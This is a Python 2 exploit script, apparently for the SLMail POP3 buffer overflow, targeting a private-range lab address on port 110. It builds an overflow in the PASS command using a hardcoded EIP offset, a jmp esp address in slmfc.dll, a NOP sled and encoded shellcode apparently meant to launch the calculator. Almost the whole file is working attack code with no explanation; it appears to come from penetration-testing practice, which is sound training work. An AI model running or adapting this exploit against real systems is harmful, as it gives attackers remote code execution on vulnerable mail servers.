#!/usr/bin/env python2

import socket
import struct

RHOST = "10.10.10.2"
RPORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# OFFSETS
# EIP 4654
# ESP 342
# EBP 4650
# jmp_esp in slmfc.dll at 5f4a358f
jmp_esp = 0x5f4a358f
nop_sled = "\x90" * 32

buf_totlen = 5000
offset_srp = 4654

shellcode_calc =  b""
shellcode_calc += b"\xba\xd5\x90\xd2\x7d\xdb\xd5\xd9\x74\x24"
shellcode_calc += b"\xf4\x58\x31\xc9\xb1\x36\x31\x50\x13\x83"
shellcode_calc += b"\xe8\xfc\x03\x50\xda\x72\x27\x81\x0c\xf0"
shellcode_calc += b"\xc8\x7a\xcc\x95\x41\x9f\xfd\x95\x36\xeb"
shellcode_calc += b"\xad\x25\x3c\xb9\x41\xcd\x10\x2a\xd2\xa3"
shellcode_calc += b"\xbc\x5d\x53\x09\x9b\x50\x64\x22\xdf\xf3"
shellcode_calc += b"\xe6\x39\x0c\xd4\xd7\xf1\x41\x15\x10\xef"
shellcode_calc += b"\xa8\x47\xc9\x7b\x1e\x78\x7e\x31\xa3\xf3"
shellcode_calc += b"\xcc\xd7\xa3\xe0\x84\xd6\x82\xb6\x9f\x80"
shellcode_calc += b"\x04\x38\x4c\xb9\x0c\x22\x91\x84\xc7\xd9"
shellcode_calc += b"\x61\x72\xd6\x0b\xb8\x7b\x75\x72\x75\x8e"
shellcode_calc += b"\x87\xb2\xb1\x71\xf2\xca\xc2\x0c\x05\x09"
shellcode_calc += b"\xb9\xca\x80\x8a\x19\x98\x33\x77\x98\x4d"
shellcode_calc += b"\xa5\xfc\x96\x3a\xa1\x5b\xba\xbd\x66\xd0"
shellcode_calc += b"\xc6\x36\x89\x37\x4f\x0c\xae\x93\x14\xd6"
shellcode_calc += b"\xcf\x82\xf0\xb9\xf0\xd5\x5b\x65\x55\x9d"
shellcode_calc += b"\x71\x72\xe4\xfc\x1f\x85\x7a\x7b\x6d\x85"
shellcode_calc += b"\x84\x84\xc1\xee\xb5\x0f\x8e\x69\x4a\xda"
shellcode_calc += b"\xeb\x96\xa8\xcf\x01\x3f\x75\x9a\xa8\x22"
shellcode_calc += b"\x86\x70\xee\x5a\x05\x71\x8e\x98\x15\xf0"
shellcode_calc += b"\x8b\xe5\x91\xe8\xe1\x76\x74\x0f\x56\x76"
shellcode_calc += b"\x5d\x61\x3d\xfc\x7e\x0b\xce\x99\x0c\xd3"
shellcode_calc += b"\x1f\x03\x95\x77\x7f\xa5\x34\x13\x1a\x09"
shellcode_calc += b"\xd1\x82\x8f\x2c\x2f\x35\x2e\xdc\x3c\xb5"

buf = ""
buf += "A" * (offset_srp - len(buf))
buf += struct.pack("<I", jmp_esp)
buf += nop_sled
buf += shellcode_calc
buf += "D"*(buf_totlen - len(buf))

data = s.recv(1024)
s.send('USER username' + '\r\n')
data = s.recv(1024)
s.send('PASS ' + buf + '\r\n')
data = s.recv(1024)
s.close
